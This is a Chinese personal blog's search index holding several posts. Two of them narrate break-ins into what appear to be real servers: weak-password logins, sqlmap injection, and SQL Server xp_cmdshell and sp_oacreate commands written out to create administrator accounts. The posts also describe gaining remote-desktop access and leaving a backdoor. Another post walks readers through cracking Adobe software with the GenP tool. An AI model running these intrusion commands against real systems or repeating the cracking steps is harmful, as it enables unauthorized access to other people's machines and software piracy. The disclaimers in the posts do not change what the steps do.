<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>低显存可跑的本地大语言模型RWKV体验</title>
      <link href="/post/RWKV/"/>
      <url>/post/RWKV/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>本项目旨在消除大语言模型的使用门槛，全自动为你处理一切，你只需要一个仅仅几MB的可执行程序。此外本项目提供了与OpenAI API兼容的接口，这意味着一切ChatGPT客户端都是RWKV客户端。   —— RWKV</p></blockquote><p>项目地址： <a href="https://github.com/josStorer/RWKV-Runner">GtiHub</a></p><p><img src="https://img.dreamfall.cn/post/RWKV/1.webp" alt=""></p><p>优点：</p><ol><li>傻瓜式操作，不需要手动配置环境，直接直接一键安装运行即可。</li><li>最低2G显存即可运行，同时支持CPU运行</li><li>与OpenAI API兼容，可以使用任何OpenAI API的客户端</li></ol><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>安装过程非常简单，只需要在 <a href="https://github.com/josStorer/RWKV-Runner/releases">Releases</a> 下载对应的可执行文件运行即可。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>可在右下角选择不同的启动参数（GPU和显存大小，CPU和内存大小）以及模型（参数数量，语言类型）。</p><p><img src="https://img.dreamfall.cn/post/RWKV/2.webp" alt=""></p><p>选择合适的选项后，点击启动即可。</p><p>第一次启动，他会自动下载模型和依赖，下载进度可在<code>下载</code>选项卡查看。</p><p>依赖和模型安装完后，点击运行即可。</p><p>当模型加载完后，即可在 <code>聊天</code> 选项卡进行聊天。</p><p><img src="https://img.dreamfall.cn/post/RWKV/3.webp" alt=""></p><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><h3 id="运行体验"><a href="#运行体验" class="headerlink" title="运行体验"></a>运行体验</h3><p>先列出我的配置：</p><ul><li>CPU：i7-12700H</li><li>内存：16G</li><li>显卡：RTX 3060 6G</li></ul><p>体验了<code>GPU-4G-3B-CN</code> 、<code>GPU-4G-7B-CN</code> 、<code>GPU-6G-3B-CN</code>  这三个模型</p><p>先说整体的使用体验，这个项目给了我一个非常大的惊喜，整体的体验意外的不错。</p><p>运行这三个模型的主要瓶颈是内存，16GB的内存实在是小，其中运行<code>GPU-4G-7B-CN</code>这个模型时，我的内存已提交达到了36GB，还好Windows有他非常强大的分页文件，也是勉强运行成功了。</p><p>模型加载完后，内存的占用会明显降低，也就加载的时候比较折磨。</p><p><img src="https://img.dreamfall.cn/post/RWKV/4.webp" alt=""></p><p>首先，我尝试的是 <code>GPU-4G-7B-CN</code> 这个模型，由于参数过多，AI的回复速度非常慢，大概一秒1-2个字，体验一般，像极了高峰期的ChatGPT，出字非常慢。但是效果比3B的好很多，回复的内容基本都是挺有逻辑的。</p><p><code>GPU-4G-3B-CN</code> 和 <code>GPU-6G-3B-CN</code> 这两个模型，回复速度非常快，基本上是秒回，体验非常好。对于短句的回复基本一样，<code>GPU-6G-3B-CN</code>对于大段文字的推理速度更快，毕竟吃的显存大。</p><h3 id="功能体验"><a href="#功能体验" class="headerlink" title="功能体验"></a>功能体验</h3><p>功能比较完整，基本上类似于ChatGPT，但由于模型参数小，所以还是会出现逻辑错误。<br>2G显存可以运行，要啥自行车。</p><h4 id="上下文聊天"><a href="#上下文聊天" class="headerlink" title="上下文聊天"></a>上下文聊天</h4><p>基本没问题，也是语言模型最基础的功能了</p><h4 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h4><p>相对还行，至少不会出现明显的语法错误</p><p><img src="https://img.dreamfall.cn/post/RWKV/5.webp" alt=""></p><h4 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h4><p>还行，但是会出现逻辑错误</p><p><img src="https://img.dreamfall.cn/post/RWKV/6.webp" alt=""></p><h4 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h4><p>能回答问题，语言也挺通顺</p><p><img src="https://img.dreamfall.cn/post/RWKV/7.webp" alt=""></p><h4 id="调教猫娘（？）"><a href="#调教猫娘（？）" class="headerlink" title="调教猫娘（？）"></a>调教猫娘（？）</h4><p>由于本地模型没有语言核查的限制，调教相对还挺成功的（</p><p><img src="https://img.dreamfall.cn/post/RWKV/8.webp" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不得不说，开源社区的力量真的是强大，能将大语言模型的运行门槛下放到这么低，现在这个项目还在不断更新，也许不久后就会推出个人模型训练的功能，到时候就能真正拥有一个自己的赛博猫娘了。</p>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从网页到远程桌面的渗透</title>
      <link href="/post/shentou/"/>
      <url>/post/shentou/</url>
      
        <content type="html"><![CDATA[<div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>以下内容属于渗透复现，未经授权的渗透测试是不允许的</p></div><div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>利用本文中的技术造成的后果与本人无关，倡导维护网络安全人人有责，共同维护网络文明和谐。</p></div><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>5.20闲着无聊，那就来挖洞吧，打穿一台机器的体验可比去外面玩成就感大多了</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>通过搜索引擎搜索到了某个网站的后台，首先使用弱口令，（123456），结果直接进去了<br><img src="https://img.dreamfall.cn/post/shentou/1.webp" alt=""></p><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><p>通常，网站的后台会存在大量的漏洞，如文件上传，SQL注入等，我使用扫描器发现了该网站后台存在SQL报错注入。</p><p><img src="https://img.dreamfall.cn/post/shentou/2.webp" alt=""></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>标记扫描器扫出的SQL注入点后，直接进sqlmap跑，成功获得了数据库列表</p><p><img src="https://img.dreamfall.cn/post/shentou/3.webp" alt=""><br><img src="https://img.dreamfall.cn/post/shentou/4.webp" alt=""></p><p>查看当前用户权限，发现是dba（数据库管理员）</p><p><img src="https://img.dreamfall.cn/post/shentou/5.webp" alt=""></p><p>查看数据库类型是SQL server，mssql的提权比mysql的方便，因为能直接调用xp_cmd模块直接执行命令</p><h3 id="尝试执行命令"><a href="#尝试执行命令" class="headerlink" title="尝试执行命令"></a>尝试执行命令</h3><p>使用os-shell执行命令失败<br><img src="https://img.dreamfall.cn/post/shentou/6.webp" alt=""></p><h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p>尝试读取数据库用户密码哈希，通过在线查询哈希<br><img src="https://img.dreamfall.cn/post/shentou/7.webp" alt=""></p><p>emmm<br><img src="https://img.dreamfall.cn/post/shentou/8.webp" alt=""></p><p>成功获取到明文密码<br><img src="https://img.dreamfall.cn/post/shentou/9.webp" alt=""></p><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>对目标服务器进行全端口扫描，发现目标机器开放了SQL server端口1433</p><p><img src="https://img.dreamfall.cn/post/shentou/10.webp" alt=""></p><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>使用数据库连接工具成功连接<br><img src="https://img.dreamfall.cn/post/shentou/11.webp" alt=""></p><h3 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h3><p>执行sql语句：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> CTE <span class="keyword">AS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">        u.name <span class="keyword">AS</span> 用户名,</span><br><span class="line">        u.is_disabled <span class="keyword">AS</span> 是否禁用,</span><br><span class="line">        g.name <span class="keyword">AS</span> 服务器角色,</span><br><span class="line">        <span class="string">&#x27;√&#x27;</span> <span class="keyword">AS</span> <span class="string">&#x27;flag&#x27;</span> </span><br><span class="line">    <span class="keyword">FROM</span></span><br><span class="line">        sys.server_principals u</span><br><span class="line">        <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_role_members m <span class="keyword">ON</span> u.principal_id <span class="operator">=</span> m.member_principal_id</span><br><span class="line">        <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals g <span class="keyword">ON</span> g.principal_id <span class="operator">=</span> m.role_principal_id </span><br><span class="line">    ) <span class="keyword">SELECT</span></span><br><span class="line">    <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    CTE PIVOT ( <span class="built_in">MAX</span> ( flag ) <span class="keyword">FOR</span> 服务器角色 <span class="keyword">IN</span> ( [public], [sysadmin], [securityadmin], [serveradmin], [setupadmin], [processadmin], [diskadmin], [dbcreator], [bulkadmin] ) ) <span class="keyword">AS</span> T;</span><br></pre></td></tr></table></figure></p><p>发现是system管理员权限<br><img src="https://img.dreamfall.cn/post/shentou/12.webp" alt=""></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>直接执行sql语句，打开xp_cmd</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use master;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/shentou/14.webp" alt=""><br>查看当前用户权限</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use master;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/shentou/15.webp" alt=""><br>发现是system权限，直接创建新的管理员账户</p><h3 id="创建管理员"><a href="#创建管理员" class="headerlink" title="创建管理员"></a>创建管理员</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use master;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;net user test12 dreamfall.cn1 /add&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/shentou/16.webp" alt=""><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">net localgroup administrators test12 <span class="operator">/</span><span class="keyword">add</span></span><br></pre></td></tr></table></figure><br><img src="https://img.dreamfall.cn/post/shentou/17.webp" alt=""></p><h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>通过远程桌面成功登录，获取目标主机的全部权限<br><img src="https://img.dreamfall.cn/post/shentou/18.webp" alt=""></p><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>在服务器中留下后门，以便随时随地访问此站</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>千万不要为了方便使用简单密码</strong></p><p>流程总结：弱口令进后台，后台sql注入，获取到数据库用户哈希，弱密码哈希破解，发现开数据库端口，直接连接，发现是dba权限，直接调用xp_cmd执行命令创建管理员账户，登录远程桌面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 日记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梦璃雨落的QQ群建立啦</title>
      <link href="/post/qq-group/"/>
      <url>/post/qq-group/</url>
      
        <content type="html"><![CDATA[<p>无论是技术问题，还是分享生活；无论是游戏交流，还是资源分享，都可以进来聊聊哦~</p><div class="btns circle grid5">            <a class="button" href='https://jq.qq.com/?_wv=1027&k=UxUgYVV9' title='加入群聊'><img src='https://img.dreamfall.cn/post/qq-group/1.webp'>加入群聊</a>          </div><p><img src="https://img.dreamfall.cn/post/qq-group/qrcode.jpg" alt="群二维码"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ群 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 SQL Server 提权到远程桌面（存在杀软）</title>
      <link href="/post/sqlserver/"/>
      <url>/post/sqlserver/</url>
      
        <content type="html"><![CDATA[<div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>以下内容属于渗透复现，未经授权的渗透测试是不允许的</p></div><div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>利用本文中的技术造成的后果与本人无关，倡导维护网络安全人人有责，共同维护网络文明和谐。</p></div><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SQL Server也称Mssql Server，是微软家的数据库，常见于操作系统是Windows Server的服务器上</p><p>SQL Server的默认超级管理员是<code>sa</code>，在早期版本中，SQL Server的权限非常大，是<code>SYSTEM</code>权限</p><p><code>sa</code>用户不仅能修改所有数据库的内容，还能直接对windows的注册表进行修改，执行命令等</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="获取数据库密码"><a href="#获取数据库密码" class="headerlink" title="获取数据库密码"></a>获取数据库密码</h3><p>通过SQL Server提权渗透，需要数据库的账号密码，不巧的是，我在扫描网站的目录时。发现了一处信息泄露，泄露的SQL Server的用户和密码，更巧的是这个网站使用的是<code>sa</code>用户，还告诉了我SQL Server的IP端口，于是我尝试连接，成功连上数据库。<br><img src="https://img.dreamfall.cn/post/sqlserver/1.webp" alt="test.asp"></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>成功连上数据库，基本上就一半成功了，接下来尝试执行命令<br><img src="https://img.dreamfall.cn/post/sqlserver/2.webp" alt="连接数据库"></p><h4 id="尝试xp-cmdshell"><a href="#尝试xp-cmdshell" class="headerlink" title="尝试xp_cmdshell"></a>尝试xp_cmdshell</h4><p>尝试直接执行命令<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure><br>失败，尝试启用<code>xp_cmdshel</code></p><ol><li><p>确认<code>xp_cmdshell</code>是否存在</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;sp_oacreate&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/sqlserver/3.webp" alt="xp_cmdshell"><br>结果为1，则证明存在</p></li><li><p>使用<code>xp_cmdshell</code>执行命令，发现报错<br> <img src="https://img.dreamfall.cn/post/sqlserver/4.webp" alt="xp_cmdshell_2"><br><code>xp_cmdshell</code>存在，却无法执行命令，我当时怀疑是<code>xplog70.dll</code>被删了，<code>xp_cmdshell</code>是通过<code>xplog70.dll</code>来执行命令的</p></li><li><p>尝试重新启用<code>xp_cmdshell</code>，结果命令结果告诉我<code>xp_cmdshell</code>不存在，在高级配置选项里也没有。<br><img src="https://img.dreamfall.cn/post/sqlserver/5.webp" alt="xp_cmdshell_3"></p></li><li><p>于是我又尝试重新加载<code>xp_cmdshell</code>，</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/sqlserver/6.webp" alt="xp_cmdshell_4"></p><p>结果告诉我数据库中已存在名为 ‘xp_cmdshell’ 的对象。</p><p>既然已经存在，那我就删了再重建<br><img src="https://img.dreamfall.cn/post/sqlserver/7.webp" alt="xp_cmdshell_5"><br>结果删都不让我删</p></li></ol><p>我当时这个人直接傻掉，第一次遇到这种情况，存在又不存在的’xp_cmdshell’</p><h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><p>于是<code>xp_cmdshell</code>没法用，我尝试使用<code>sp_oacreate</code>提权</p><ol><li><p>尝试用系统<code>wscript.shell</code>来执行系统命令</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net users &gt; F:\tmp\1.txt&#x27;</span></span><br></pre></td></tr></table></figure><p>执行<code>net user</code>命令，并将命令的结果写入网站目录下<code>1.txt</code>文件中，通过浏览器访问该文件，获取命令回显<br><img src="https://img.dreamfall.cn/post/sqlserver/10.webp" alt="sp_oacreate"><br>访问文件，发现命令执行成功<br><img src="https://img.dreamfall.cn/post/sqlserver/9.webp" alt="sp_oacreate_2"></p></li><li><p>创建用户，添加用户到<code>administrators</code>组</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output</span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user abcd 123456 /add&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators abcd /add&#x27;</span></span><br></pre></td></tr></table></figure></li><li>查看远程桌面服务是否启动<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_regread <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span> ,<span class="string">&#x27;fDenyTSConnections&#x27;</span></span><br></pre></td></tr></table></figure>0表示开启</li><li><p>获取远程桌面端口</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_regread <span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27;</span>,<span class="string">&#x27;PortNumber&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="https://img.dreamfall.cn/post/sqlserver/11.webp" alt="远程桌面"></p></li><li><p>用windows自带的远程桌面连接成功连上服务器<br><img src="https://img.dreamfall.cn/post/sqlserver/12.webp" alt="远程桌面2"><br>发现了这电脑上存在杀软，居然是电脑管家。。。</p></li></ol><p>翻看日志，发现我用 ‘xp_cmdshell’ 执行的命令被这电脑管家拦截了。。。<br><img src="https://img.dreamfall.cn/post/sqlserver/8.webp" alt="电脑管家"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>数据库的管理员账号不要使用于生产环境，一旦成功登录，基本上就离控住你电脑不远了</li><li>记得清理网站目录下的文件，防止被利用</li><li>腾讯电脑管家用处不大，但总比裸奔好</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> SQL Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 日记 </tag>
            
            <tag> SQL Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wappalyzer，扒技术框架神器（</title>
      <link href="/post/wappalyzer/"/>
      <url>/post/wappalyzer/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先放上链接吧</p><ul><li><a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN">Chrome 应用商店</a></li><li><a href="https://microsoftedge.microsoft.com/addons/detail/wappalyzer-technology-p/mnbndgmknlpdjdnjfmfcdjoegcckoikn">Edge 外接程序</a></li></ul><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>引用官方介绍</p><blockquote><p>Wappalyzer揭示了网站上使用的技术。它可以检测内容管理系统、电子商务平台、Web 框架、服务器软件、分析工具等等。</p></blockquote><h2 id="具体截图"><a href="#具体截图" class="headerlink" title="具体截图"></a>具体截图</h2><ul><li>以我的博客首页为例<br><img src="https://img.dreamfall.cn/post/wappalyzer/1.webp" alt="我的博客"><br>在里面可以看到这个网站使用的各项技术，包括但不限于前端框架，前端库，可以说是一个非常使用的浏览器工具</li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
          <category> 浏览器扩展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wappalyzer </tag>
            
            <tag> 扩展程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用路由器解除浙江闪讯设备限制</title>
      <link href="/post/netkeeper/"/>
      <url>/post/netkeeper/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>经过的高考，我终于来到了大学，只不过我这校园网是真的令人无语，虽然网速能到100M，但是却只能<strong>一个</strong>设备登录，并且还得要用专门的软件登录</p><p>而我的设备却非常多（两个手机，电脑，香橙派）</p><p>并且我们寝室也有联机需求，需要共用一个局域网</p><h2 id="寻找解决方案"><a href="#寻找解决方案" class="headerlink" title="寻找解决方案"></a>寻找解决方案</h2><p>学校的校园网认证需要用到<strong>netkeeper（闪讯）</strong>这个软件</p><p><img src="https://img.dreamfall.cn/post/netkeeper/1.webp" alt="闪讯"></p><p>于是，我先从软件下手，在软件安装目录寻找校园网认证的原理</p><p>然后，当我翻到日志文件夹的时候，找到了一个叫<strong>xlpppoe.log</strong>文件，已经在日志文件中找到了<strong>PPPoE</strong>服务</p><p><img src="https://img.dreamfall.cn/post/netkeeper/2.webp" alt="日志"></p><p>于是，我觉的有可能校园网认证是通过<strong>PPPoE拨号</strong>实现的</p><p>同时，我在Windows网络里看到由闪讯创建的拨号连接，这让我更加确信这个选择<br><img src="https://img.dreamfall.cn/post/netkeeper/5.webp" alt="网络"></p><h2 id="尝试解决问题"><a href="#尝试解决问题" class="headerlink" title="尝试解决问题"></a>尝试解决问题</h2><p>既然软件是通过<strong>PPPoE</strong>拨号实现认证的，那么，直接使用路由器的PPPoE拨号不就能实现了吗</p><p>于是，我把路由器wan口连上面板，然后使用PPPoE拨号上网，结果居然成功了，路由器成功的获取到了ip地址，网页也能正常打开</p><p><img src="https://img.dreamfall.cn/post/netkeeper/3.webp" alt="路由器"></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>由于闪讯的密码每隔28小时需要更换，每次更换都要登录路由器后台，非常麻烦，于是我在网上找到了<strong>openwrt</strong>的一个插件<a href="https://github.com/miao1007/Openwrt-NetKeeper">闪讯拦截</a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>闪讯拦截这个插件可以通过拦截电脑或手机的拨号请求，截取账号和密码，在路由器上自动PPPoE拨号，从而简化拨号步骤</p><ul><li>缺点：仅支持openwrt固件，需要动手能力</li><li>优点：简化步骤，相对方便</li></ul><h3 id="短信自动登录"><a href="#短信自动登录" class="headerlink" title="短信自动登录"></a>短信自动登录</h3><p>关于短信自动登录，这里又涉及到另外一个APP：<a href="https://github.com/kuretru/SingleNet-Robot">闪讯机器人</a></p><p>只需要在路由器上装上<code>luci-mod-rpc</code>这个包，再在手机客户端配置好账号，密码和发送卡号、定时器就能使用</p><p><img src="https://img.dreamfall.cn/post/netkeeper/4.webp" alt="闪讯机器人"></p><ul><li>优点：完全自动，解放双手</li><li>缺点：仅支持安卓，容易掉后台，手机需要连到路由器</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>解除限制方法非常简单，使用路由器的PPPoE拨号就可完成</p><p>PPPoE账号和密码就是netkeeper中的账号密码</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 闪讯 </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎样正确白嫖Adobe 2022全家桶呢？</title>
      <link href="/post/adobe/"/>
      <url>/post/adobe/</url>
      
        <content type="html"><![CDATA[<div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>如果你有能力入正的，建议支持正版</p></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Adobe的产品在设计制作领域占据半边天，但它价格实在是太贵了，单单是Ps+Lrc就要<strong>888 RMB</strong>一年，这对于像我这种本来就不富裕的家庭雪上加霜。<br>互联网上，各种破解资源层出不穷，而这些资源，要么就是坑，无法使用，要么就是需要特强的动手能力，普通小白根本不会操作。</p></blockquote><ul><li>那么，有没有什么方法可以<del>白嫖</del>获得Adobe全家桶呢？</li><li>本期教程将教你简便，高效的白嫖Adobe全家桶</li></ul><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="Adobe账号"><a href="#Adobe账号" class="headerlink" title="Adobe账号"></a>Adobe账号</h3><p>首先需要有一个Adobe账号，去<a href="https://www.adobe.com/cn/">Adobe官网</a>点击右上角的登录，然后按照步骤创建账户即可</p><p><img src="https://img.dreamfall.cn/post/adobe/1.webp" alt="注册"></p><h3 id="Adobe-Creative-Cloud"><a href="#Adobe-Creative-Cloud" class="headerlink" title="Adobe Creative Cloud"></a>Adobe Creative Cloud</h3><ol><li>可前往Adobe Creative Cloud页面登录Adobe账号，<strong>免费试用</strong>一个你要安装的Adobe软件，他会自动安装Adobe Creative Cloud，这里以Pr为例。</li></ol><p><img src="https://img.dreamfall.cn/post/adobe/2.webp" alt="下载"></p><p><img src="https://img.dreamfall.cn/post/adobe/3.webp" alt="安装"></p><ol><li>给予安装程序权限后登录账号，无脑下一步安装就行了（这可能需要几分钟的时间）</li></ol><p><img src="https://img.dreamfall.cn/post/adobe/4.webp" alt="安装2"></p><ul><li>请注意，默认安装目录是在C盘的<code>Program Files\Adobe</code>目录下，如果C盘空间小的话可以安装后把Pr卸载后再安装<br>关于修改安装目录，可以看下面</li></ul><details class="folding-tag" yellow><summary> 修改默认安装目录 </summary>              <div class='content'>              <p>打开<strong>Adobe Creative Cloud</strong>，在点左上角<code>三横-文件-首选项</code>，然后在应用程序里选项卡里可以修改</p><p><img src="https://img.dreamfall.cn/post/adobe/6.webp" alt="修改目录"></p><p><img src="https://img.dreamfall.cn/post/adobe/7.webp" alt="修改目录"></p><ul><li>请记住你的安装目录，后面需要用到</li></ul>              </div>            </details><h3 id="安装Adobe全家桶"><a href="#安装Adobe全家桶" class="headerlink" title="安装Adobe全家桶"></a>安装Adobe全家桶</h3><p>可在Adobe Creative Cloud中选择你要装的Adobe软件，然后点击<strong>试用</strong>，接着要的软件就会自动安装</p><p><img src="https://img.dreamfall.cn/post/adobe/5.webp" alt="安装"></p><h3 id="关于自动更新"><a href="#关于自动更新" class="headerlink" title="关于自动更新"></a>关于自动更新</h3><p>建议关闭自动更新，不然软件每更新一次都需要用工具白嫖一次</p><h2 id="白嫖"><a href="#白嫖" class="headerlink" title="白嫖"></a>白嫖</h2><ol><li><p>下载<a href="https://pan.dreamfall.cn/%E8%BD%AF%E4%BB%B6/Adobe-GenP-2.7.zip"><strong>Adobe-GenP-梦璃雨落的网盘</strong></a>，解压</p></li><li><p>运行文件夹里的<code>RunMe.exe</code></p></li><li>在红色框里勾上你要白嫖的应用，点击下面的<strong>药丸</strong><br><img src="https://img.dreamfall.cn/post/adobe/8.webp" alt="软件"></li><li>这里以<strong>Pr</strong>为例，找到你Pr的安装目录，默认在<code>C:\Program Files\Adobe</code>，在根目录下找到与右下角<strong>完全</strong>对应的文件（不同软件选择的文件不同），打开<br><img src="https://img.dreamfall.cn/post/adobe/9.webp" alt="选择"></li><li>接下了程序就会自动运行，等进度条跑完，就成功了</li></ol><ul><li><strong>快去使用你梦寐以求的Adobe全家桶吧</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
          <category> 教程 </category>
          
          <category> Adobe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Adobe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快来自定义你的adobe启动图吧</title>
      <link href="/post/adobe-start/"/>
      <url>/post/adobe-start/</url>
      
